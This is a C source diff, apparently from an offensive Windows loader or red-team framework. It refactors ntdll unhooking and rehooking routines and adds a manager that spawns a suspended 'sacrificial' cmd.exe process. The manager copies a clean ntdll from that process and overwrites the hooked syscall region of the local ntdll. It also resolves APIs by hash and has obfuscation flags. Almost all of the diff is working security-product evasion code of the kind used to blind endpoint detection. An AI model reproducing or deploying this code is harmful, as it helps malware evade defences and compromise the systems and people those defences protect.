@@ -372,7 +372,7 @@ INT FindLastSysCall(CHAR* pMem, DWORD size) {
     return offset;
 }
 
-static INT UnHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheClean, CONST VOID* pCacheHooked){
+static INT UnHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheClean){
 #if CONFIG_OBFUSCATION & 0
     UCHAR s_string[] = S_KERNEL32;
     UCHAR d_string[13] = {0};
@@ -400,7 +400,8 @@ static INT UnHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheClean, CONST VOID
 
 
 #if CONFIG_NATIVE
-
+    VOID* baseAddress = NULL;
+    SIZE_T size = 0;
     NtProtectVirtualMemory_t p_NtProtectVirtualMemory =
             (NtProtectVirtualMemory_t) GetProcAddressByHash(p_ntdll, NtProtectVirtualMemory_CRC32B);
 
@@ -417,8 +418,10 @@ static INT UnHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheClean, CONST VOID
             // prepare ntdll.dll memory region for write permissions.
 
 #if CONFIG_NATIVE
-            check_debug(p_NtProtectVirtualMemory(NtCurrentProcess, (LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
-                                                 pImgSectionHead->Misc.VirtualSize,
+            baseAddress = hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress;
+            size = pImgSectionHead->Misc.VirtualSize;
+            check_debug(p_NtProtectVirtualMemory(NtCurrentProcess, &baseAddress,
+                                                 &size,
                                                  PAGE_EXECUTE_READWRITE,
                                                  &oldProtect) == 0, "NtProtectVirtualMemory Failed!");
 #else
@@ -435,19 +438,16 @@ static INT UnHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheClean, CONST VOID
             if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
                 DWORD SC_size = SC_end - SC_start;
 
-                // copy hooked version to pCacheHooked
-                mem_cpy((LPVOID)((DWORD_PTR) pCacheHooked + + SC_start),
-                        (LPVOID)((DWORD_PTR) hNtdll + SC_start),
-                        SC_size);
-
                 // copy clean version to ntdll memory
                 mem_cpy( (LPVOID)((DWORD_PTR) hNtdll + SC_start),
                         (LPVOID)((DWORD_PTR) pCacheClean + + SC_start),
                         SC_size);
             }
 #if CONFIG_NATIVE
-            check_debug(p_NtProtectVirtualMemory(NtCurrentProcess, (LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
-                                                 pImgSectionHead->Misc.VirtualSize,
+            baseAddress = hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress;
+            size = pImgSectionHead->Misc.VirtualSize;
+            check_debug(p_NtProtectVirtualMemory(NtCurrentProcess, &baseAddress,
+                                                 &size,
                                                  oldProtect,
                                                  &oldProtect) == 0, "NtProtectVirtualMemory Failed!");
 #else
@@ -469,7 +469,7 @@ LEAVE:
 
 }
 
-static INT ReHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheHooked, CONST VOID* pCacheClean){
+static INT ReHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheHooked){
 #if CONFIG_OBFUSCATION & 0
     UCHAR s_string[] = S_KERNEL32;
     UCHAR d_string[13] = {0};
@@ -497,6 +497,8 @@ static INT ReHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheHooked, CONST VOI
 
 
 #if CONFIG_NATIVE
+    VOID* baseAddress = NULL;
+    SIZE_T size = 0;
 
     NtProtectVirtualMemory_t p_NtProtectVirtualMemory =
             (NtProtectVirtualMemory_t) GetProcAddressByHash(p_ntdll, NtProtectVirtualMemory_CRC32B);
@@ -514,8 +516,10 @@ static INT ReHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheHooked, CONST VOI
             // prepare ntdll.dll memory region for write permissions.
 
 #if CONFIG_NATIVE
-            check_debug(p_NtProtectVirtualMemory(NtCurrentProcess, (LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
-                                                 pImgSectionHead->Misc.VirtualSize,
+            baseAddress = hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress;
+            size = pImgSectionHead->Misc.VirtualSize;
+            check_debug(p_NtProtectVirtualMemory(NtCurrentProcess, &baseAddress,
+                                                 &size,
                                                  PAGE_EXECUTE_READWRITE,
                                                  &oldProtect) == 0, "NtProtectVirtualMemory Failed!");
 #else
@@ -538,8 +542,10 @@ static INT ReHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheHooked, CONST VOI
                          SC_size);
             }
 #if CONFIG_NATIVE
-            check_debug(p_NtProtectVirtualMemory(NtCurrentProcess, (LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
-                                                 pImgSectionHead->Misc.VirtualSize,
+            baseAddress = hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress;
+            size = pImgSectionHead->Misc.VirtualSize;
+            check_debug(p_NtProtectVirtualMemory(NtCurrentProcess, &baseAddress,
+                                                 &size,
                                                  oldProtect,
                                                  &oldProtect) == 0, "NtProtectVirtualMemory Failed!");
 #else
@@ -553,10 +559,53 @@ static INT ReHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheHooked, CONST VOI
         }
     }
 
-    LEAVE:
+LEAVE:
 //TODO: Memory clean up
 
     // failed? || .text not found!
     return -1;
 
+}
+
+// True if Unhooking, False if Rehooking
+VOID HookingManager(BOOL UnHook){
+
+#if defined(CONFIG_ARCH) && (CONFIG_ARCH == 64)
+    PVOID p_ntdll = get_ntdll_64();
+#else
+    PVOID p_ntdll = get_ntdll_32();
+#endif //CONFIG_ARCH
+
+    STARTUPINFOA si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+
+    check_debug(CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, FALSE,\
+            CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
+            NULL,
+            "C:\\Windows\\System32\\",
+            &si,
+            &pi) != 0, "CreateProcessA Failed!");
+
+    IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) p_ntdll;
+    IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (p_ntdll + pDosHdr->e_lfanew);
+    IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
+
+    SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;
+
+    // allocate local buffer to hold temporary copy of ntdll from remote process
+    LPVOID pCache = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);
+    SIZE_T bytesRead = 0;
+
+    if(UnHook){
+        check_debug(ReadProcessMemory(pi.hProcess, p_ntdll, pCache, ntdll_size, &bytesRead) != 0, "ReadProcessMemory Failed!");
+        UnHookNtdll(p_ntdll, pCache);
+    }else{
+        mem_cpy(pCache, p_ntdll, ntdll_size);
+        ReHookNtdll(p_ntdll, pCache);
+    }
+
+
+LEAVE:
+    // Kill sacrificial process
+    TerminateProcess(pi.hProcess, 0);
 }
